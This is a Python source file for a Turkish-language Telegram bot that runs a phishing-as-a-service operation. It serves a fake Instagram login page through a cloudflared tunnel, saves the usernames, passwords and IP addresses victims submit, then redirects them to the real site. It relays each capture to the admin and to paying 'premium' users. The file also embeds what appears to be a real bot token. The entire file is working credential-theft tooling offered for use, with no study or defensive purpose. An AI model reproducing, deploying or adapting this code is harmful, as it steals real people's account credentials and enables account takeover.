
import asyncio
import json
import os
import subprocess
import threading
import time
import nest_asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

nest_asyncio.apply()

# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = "8366855341:AAHauyMwWYcruSFAddfTwnlGdcs1UKWyFuo"
ADMIN_ID = 7999336769

PORT_RANGE = [8080, 8081, 8082, 3000, 3001, 4444]
USERS_FILE = "premium_users.json"
CAPTURES_DIR = "captures"

premium_users = set()
active_tunnels = {}
bot_app = None

if not os.path.exists(CAPTURES_DIR):
    os.makedirs(CAPTURES_DIR)

INSTAGRAM_HTML = '''<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    @font-face {
      font-family: 'Billabong';
      src: url('https://fonts.cdnfonts.com/s/3780/Billabong.woff') format('woff');
      font-weight: normal;
      font-style: normal;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #fafafa;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 16px;
    }
    .container {
      max-width: 935px;
      width: 100%;
      display: flex;
      align-items: center;
      gap: 48px;
    }
    .phone-mockup {
      flex: 1;
      max-width: 454px;
      display: none;
    }
    @media (min-width: 875px) {
      .phone-mockup { display: block; }
    }
    .phone-mockup img { width: 100%; height: auto; }
    .login-card {
      width: 350px;
      background: white;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      padding: 36px 40px 20px;
      text-align: center;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
    }
    .logo {
      font-family: 'Billabong', cursive;
      font-size: 3.25rem;
      line-height: 0.95;
      letter-spacing: -2.5px;
      margin: 0 0 24px;
      color: #262626;
      font-weight: normal;
      text-shadow: 0 1px 2px rgba(0,0,0,0.08);
    }
    .input-group {
      margin-bottom: 14px;
    }
    input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
      font-size: 14px;
      transition: all 0.2s ease;
    }
    input:focus {
      border-color: #0095f6;
      background: white;
      box-shadow: 0 0 0 2px rgba(0,149,246,0.2);
      outline: none;
    }
    .submit-btn {
      width: 100%;
      background: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 9px 0;
      font-weight: 600;
      font-size: 14px;
      margin: 10px 0 16px;
      cursor: pointer;
      transition: background 0.2s ease;
    }
    .submit-btn:hover:not(:disabled) {
      background: #1877f2;
    }
    .submit-btn:disabled {
      background: #b2dffc;
      cursor: not-allowed;
    }
    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
    }
    .divider::before, .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
      margin: 0 18px;
    }
    .fb-btn {
      width: 100%;
      background: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 8px 0;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin: 8px 0;
    }
    .fb-btn img { width: 16px; height: 16px; }
    .forgot {
      color: #00376b;
      font-size: 12px;
      margin: 14px 0;
      text-decoration: none;
      display: block;
    }
    .signup-box {
      background: white;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      padding: 20px;
      margin-top: 16px;
      font-size: 14px;
    }
    .signup-box a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }
    .footer {
      margin-top: 60px;
      font-size: 12px;
      color: #8e8e8e;
      text-align: center;
    }
    .footer a {
      color: #8e8e8e;
      margin: 0 8px;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="phone-mockup">
      <img src="https://www.instagram.com/static/images/homepage/phones/home-phones-2x.png/9364675fb26a.png" alt="">
    </div>

    <div>
      <div class="login-card">
        <h1 class="logo">Instagram</h1>

        <form id="loginForm" action="/capture" method="POST">
          <div class="input-group">
            <input type="text" name="username" placeholder="Telefon, kullanıcı adı veya e-posta" required autocomplete="off">
          </div>
          <div class="input-group">
            <input type="password" name="password" placeholder="Şifre" required autocomplete="off">
          </div>
          <button type="submit" class="submit-btn" id="submitBtn">Giriş Yap</button>
        </form>

        <div class="divider">veya</div>

        <button class="fb-btn">
          <img src="https://img.icons8.com/color/16/facebook-new--v1.png" alt=""> Facebook ile Giriş Yap
        </button>

        <a href="#" class="forgot">Şifreni mi unuttun?</a>
      </div>

      <div class="signup-box">
        Hesabın yok mu? <a href="#">Kaydol</a>
      </div>

      <div class="footer">
        <p>© 2026 Instagram from Meta</p>
        <div>
          <a href="#">Hakkında</a> · <a href="#">Blog</a> · <a href="#">İş</a> · <a href="#">Yardım</a>
        </div>
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const btn = document.getElementById('submitBtn');

    form.addEventListener('submit', (e) => {
      btn.disabled = true;
      btn.innerHTML = 'Giriş yapılıyor<span class="dots"></span>';

      let dots = 0;
      const interval = setInterval(() => {
        dots = (dots + 1) % 4;
        btn.querySelector('.dots').innerHTML = '.'.repeat(dots);
      }, 400);
    });
  </script>
</body>
</html>'''

def load_data():
    global premium_users
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                premium_users = set(data.get('users', []))
        except:
            premium_users = set()

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({'users': list(premium_users)}, f, indent=2)
    except:
        pass

def get_user_from_port(port):
    for uid, tunnel in active_tunnels.items():
        if tunnel.get('port') == port:
            return uid
    return None

def save_capture(ip, username, password, port):
    user_id = get_user_from_port(port)
    if not user_id:
        print(f"⚠️ Bilinmeyen port: {port}")
        return

    filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
    data = {'captures': []}
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
        except:
            pass

    data['captures'].append({
        'ip': ip,
        'username': username,
        'password': password,
        'time': datetime.now().isoformat()
    })

    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"💾 Capture kaydedildi: {username} → {user_id}")
        asyncio.create_task(notify_admin(ip, username, password, user_id))
    except Exception as e:
        print(f"❌ Save error: {e}")

def is_port_free(port):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(('0.0.0.0', port))
        return True
    except:
        return False
    finally:
        s.close()

def find_free_port():
    for port in PORT_RANGE:
        if is_port_free(port):
            return port
    return 8080

class PhishingServer:
    def __init__(self, port):
        self.port = port
        self.server_thread = None

    def start(self):
        import http.server
        import socketserver
        import urllib.parse

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path in ['/', '']:
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(INSTAGRAM_HTML.encode('utf-8'))
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                if self.path == '/capture':
                    try:
                        length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(length).decode('utf-8')
                        parsed = urllib.parse.parse_qs(post_data)

                        username = parsed.get('username', [''])[0]
                        password = parsed.get('password', [''])[0]
                        ip = self.client_address[0]
                        port = self.server.server_address[1]

                        save_capture(ip, username, password, port)

                        self.send_response(302)
                        self.send_header('Location', 'https://www.instagram.com/')
                        self.end_headers()
                    except Exception as e:
                        print(f"POST error: {e}")
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

        httpd = socketserver.TCPServer(("0.0.0.0", self.port), Handler)
        self.server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
        self.server_thread.start()
        print(f"🌐 Server http://localhost:{self.port}")
        return httpd

async def notify_admin(ip, username, password, user_id):
    global bot_app
    try:
        await bot_app.bot.send_message(
            ADMIN_ID,
            f"🎣 **LIVE CAPTURE!**\n\n"
            f"👤 Kullanıcı: `{user_id}`\n"
            f"🎯 Hedef: `{username}`\n"
            f"🔑 `{password}`\n"
            f"🌐 `{ip}`\n"
            f"🕐 `{datetime.now().strftime('%H:%M:%S')}`",
            parse_mode='Markdown'
        )
    except:
        pass

def start_cloudflare_tunnel(port):
    cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1,
            preexec_fn=os.setsid
        )

        time.sleep(5)

        for i in range(30):
            line = proc.stdout.readline()
            if not line and i > 20:
                break
            if ".trycloudflare.com" in line:
                parts = line.split("https://")
                if len(parts) > 1:
                    url_match = parts[1].split()[0].strip()
                    url = "https://" + url_match
                    print(f"🔗 TUNNEL: {url}")
                    return url, proc
            time.sleep(0.5)

        print("❌ URL timeout!")
        return None, proc
    except Exception as e:
        print(f"❌ Cloudflared error: {e}")
        return None, None

# ═══════════════════════════════════════════════════════════════ YARDIMCI FONKSİYON
async def edit_with_back(query, text, kb=None, parse_mode='Markdown'):
    back_kb = [[InlineKeyboardButton("🔙 Geri", callback_data="back_to_start")]]
    if kb:
        back_kb = kb + back_kb
    reply_markup = InlineKeyboardMarkup(back_kb)
    await query.edit_message_text(text, parse_mode=parse_mode, reply_markup=reply_markup)

# ═══════════════════════════════════════════════════════════════ KOMUTLAR
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)

    if user_id == str(ADMIN_ID):
        keyboard = [
            [InlineKeyboardButton("👥 Kullanıcı Yönetimi", callback_data="manage")],
            [InlineKeyboardButton("📊 Benim Captures", callback_data="my_captures")],
            [InlineKeyboardButton("🌐 Tüm Captureler", callback_data="all_captures")],
            [InlineKeyboardButton("🗑️ Benim Capture'leri Sıfırla", callback_data="reset_my")],
            [InlineKeyboardButton("🗑️ Tüm Capture'leri Sıfırla", callback_data="reset_all")],
            [InlineKeyboardButton("🔗 Benim Tunnel", callback_data="tunnel")]
        ]
    elif user_id in premium_users:
        keyboard = [
            [InlineKeyboardButton("🔗 Tunnel Başlat", callback_data="tunnel")],
            [InlineKeyboardButton("📊 Benim Son 5 Capture", callback_data="my_captures")],
            [InlineKeyboardButton("🗑️ Capture'lerimi Sıfırla", callback_data="reset_my")]
        ]
    else:
        await update.message.reply_text("❌ Premium değilsin!\nAdmin `/add_user {ID veya @username}` bekle.")
        return

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🚀 *IGCap Premium Bot*\n\n"
        f"👤 `{update.effective_user.first_name}`\n"
        "Seçiminizi yapın:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)

    if query.data == "back_to_start":
        await start_cmd(update, context)
        return

    if query.data == "manage" and user_id == str(ADMIN_ID):
        users_list = []
        for u in premium_users:
            try:
                int(u)
                display = f"`{u}` (ID)"
            except ValueError:
                display = f"`@{u}` (username)"
            users_list.append(f"• {display}")
        users_list = "\n".join(users_list) if users_list else "• Yok"
        text = f"📋 *Premium Users:*\n{users_list}\n\n*Kullan:* `/add_user 123456` veya `/add_user @username`"
        await edit_with_back(query, text)

    elif query.data == "my_captures":
        filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
        if not os.path.exists(filename):
            await edit_with_back(query, "📭 Henüz capture'n yok.")
            return

        try:
            with open(filename, 'r') as f:
                data = json.load(f)
                caps = data.get('captures', [])[-5:]
                if not caps:
                    text = "📭 Henüz capture yok."
                else:
                    text = "📊 **Senin Son 5 Capture:**\n\n"
                    for c in caps:
                        text += (
                            f"👤 `{c['username']}`\n"
                            f"🔑 `{c['password']}`\n"
                            f"🌐 `{c['ip']}`\n"
                            f"🕐 `{c['time'][:19].replace('T', ' ')}`\n\n"
                        )
            await edit_with_back(query, text)
        except Exception as e:
            await edit_with_back(query, f"❌ Dosya okuma hatası: {str(e)}")

    elif query.data == "reset_my":
        filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
        if os.path.exists(filename):
            os.remove(filename)
            text = "🗑️ **Kendi capture'lerin sıfırlandı!**"
        else:
            text = "📭 Zaten capture'n yok."
        await edit_with_back(query, text)

    elif query.data == "reset_all" and user_id == str(ADMIN_ID):
        count = 0
        for file in os.listdir(CAPTURES_DIR):
            if file.startswith("captures_") and file.endswith(".json"):
                os.remove(os.path.join(CAPTURES_DIR, file))
                count += 1
        text = f"🗑️ **Tüm capture'ler sıfırlandı!** ({count} kullanıcı dosyası silindi)"
        await edit_with_back(query, text)

    elif query.data == "all_captures" and user_id == str(ADMIN_ID):
        text = "🌐 **Tüm Kullanıcıların Capture'leri:**\n\n"
        found = False
        for file in os.listdir(CAPTURES_DIR):
            if file.startswith("captures_") and file.endswith(".json"):
                user_file_id = file.replace("captures_", "").replace(".json", "")
                try:
                    with open(os.path.join(CAPTURES_DIR, file), 'r') as f:
                        data = json.load(f)
                        caps = data.get('captures', [])
                        if caps:
                            found = True
                            text += f"👤 Kullanıcı `{user_file_id}` ({len(caps)} capture):\n"
                            for c in caps[-5:]:
                                text += (
                                    f"  • `{c['username']}` | `{c['password']}`\n"
                                    f"    IP: `{c['ip']}` | Zaman: `{c['time'][:19]}`\n"
                                )
                            text += "\n"
                except:
                    pass
        if not found:
            text += "📭 Henüz hiç capture yok."
        await edit_with_back(query, text)

    elif query.data == "tunnel":
        await create_tunnel(query, user_id)

    elif query.data.startswith("kill_"):
        await kill_tunnel(update, context)

async def create_tunnel(query, user_id):
    if user_id in active_tunnels:
        tunnel = active_tunnels[user_id]
        remain = int(tunnel['end_time'] - time.time())
        if remain > 0:
            kb = [[InlineKeyboardButton("❌ Kapat", callback_data=f"kill_{user_id}")]]
            text = f"⏳ *Aktif tunnel:* `{tunnel['url']}`\n⏰ *Kalan:* `{remain//60}m {remain%60:02d}s`"
            await edit_with_back(query, text, kb)
            return

    await query.edit_message_text("🔄 *Phishing + tunnel hazırlanıyor...*")

    port = find_free_port()
    phishing = PhishingServer(port)
    phishing.start()

    url, proc = start_cloudflare_tunnel(port)

    if url and proc:
        end_time = time.time() + 600
        active_tunnels[user_id] = {
            'url': url,
            'port': port,
            'proc': proc,
            'phishing': phishing,
            'end_time': end_time
        }

        kb = [[InlineKeyboardButton("🔒 Kapat", callback_data=f"kill_{user_id}")]]
        text = (
            f"✅ **TUNNEL HAZIR!**\n\n"
            f"🔗 `{url}`\n"
            f"⏰ **10 dakika** aktif\n"
            f"📱 **Paylaşın!**\n\n"
            f"*Live capture sana ve admine!* 🎣"
        )
        await edit_with_back(query, text, kb)

        if user_id != str(ADMIN_ID):
            try:
                await bot_app.bot.send_message(
                    ADMIN_ID,
                    f"🆕 **Yeni tunnel!**\n"
                    f"👤 `{query.from_user.first_name}` (`{user_id}`)\n"
                    f"🔗 `{url}`",
                    parse_mode='Markdown'
                )
            except:
                pass
    else:
        await edit_with_back(query, "❌ **HATA! Cloudflared çalışmıyor**")

async def kill_tunnel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.data.split("_")[1]

    if user_id not in active_tunnels:
        await query.answer("❌ Tunnel zaten yok!")
        return

    tunnel = active_tunnels[user_id]
    closed = False

    try:
        tunnel['proc'].terminate()
        tunnel['proc'].wait(timeout=5)
        closed = True
    except:
        pass

    if not closed:
        try:
            tunnel['proc'].kill()
            tunnel['proc'].wait(timeout=3)
            closed = True
        except:
            pass

    if not closed:
        try:
            subprocess.run(["pkill", "-9", "-f", "cloudflared"], timeout=5)
            closed = True
        except:
            pass

    time.sleep(1.5)

    if user_id in active_tunnels:
        del active_tunnels[user_id]

    text = "🔒 **Tunnel başarıyla kapatıldı!**" if closed else "⚠️ **Tunnel kapatma denendi ama tam kapanmayabilir.**\n`pkill -9 cloudflared` dene."
    await edit_with_back(query, text)

# ═══════════════════════════════════════════════════════════════ KOMUTLAR
async def cmd_add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/add_user 123456` veya `/add_user @username`")
        return

    arg = context.args[0].strip()
    if arg.startswith('@'):
        uid_to_add = arg[1:]
        display = f"@{uid_to_add}"
    else:
        try:
            uid_to_add = int(arg)
            display = str(uid_to_add)
        except:
            await update.message.reply_text("❌ Geçersiz!")
            return

    premium_users.add(str(uid_to_add))
    save_users()
    await update.message.reply_text(f"✅ **{display}** premium yapıldı!")

async def cmd_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/remove_user 123456` veya `/remove_user @username`")
        return

    arg = context.args[0].strip()
    if arg.startswith('@'):
        username = arg[1:]
        uid_to_remove = username
        display = f"@{username}"
    else:
        try:
            uid_to_remove = int(arg)
            display = str(uid_to_remove)
        except ValueError:
            await update.message.reply_text("❌ Geçersiz!")
            return

    removed = premium_users.discard(str(uid_to_remove))
    save_users()

    if removed:
        await update.message.reply_text(f"✅ **{display}** premium'dan kaldırıldı!")
    else:
        await update.message.reply_text(f"ℹ️ **{display}** zaten premium değil.")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    active_count = len(active_tunnels)
    users_count = len(premium_users)
    await update.message.reply_text(
        f"📊 **Status:**\n"
        f"• Aktif tunnel: **{active_count}**\n"
        f"• Premium user: **{users_count}**"
    )

# ═══════════════════════════════════════════════════════════════ MAIN
def cleanup_loop():
    while True:
        try:
            current = time.time()
            to_kill = []
            for uid, tunnel in list(active_tunnels.items()):
                if current > tunnel['end_time']:
                    try:
                        tunnel['proc'].terminate()
                    except:
                        pass
                    try:
                        subprocess.run(["pkill", "-9", "-f", f"cloudflared.*{tunnel['port']}"], check=False)
                    except:
                        pass
                    to_kill.append(uid)

            for uid in to_kill:
                del active_tunnels[uid]
            time.sleep(30)
        except:
            time.sleep(30)

async def main():
    global bot_app

    print("📦 Veri yükleniyor...")
    load_data()
    print(f"✅ {len(premium_users)} premium user")

    try:
        subprocess.run(["cloudflared", "--version"], capture_output=True, check=True)
        print("✅ Cloudflared OK")
    except:
        print("⚠️ Cloudflared yok!")

    print("🤖 Bot başlatılıyor...")
    bot_app = Application.builder().token(BOT_TOKEN).build()

    bot_app.add_handler(CommandHandler("start", start_cmd))
    bot_app.add_handler(CommandHandler("add_user", cmd_add_user))
    bot_app.add_handler(CommandHandler("remove_user", cmd_remove_user))
    bot_app.add_handler(CommandHandler("status", cmd_status))
    bot_app.add_handler(CallbackQueryHandler(button_callback))

    threading.Thread(target=cleanup_loop, daemon=True).start()

    print("🚀 Bot hazır!")

    await bot_app.initialize()
    await bot_app.start()
    await bot_app.updater.start_polling(drop_pending_updates=True, poll_interval=0.5)

    try:
        while True:
            await asyncio.sleep(100)
    except KeyboardInterrupt:
        print("\n👋 Kapatılıyor...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot kapatıldı!")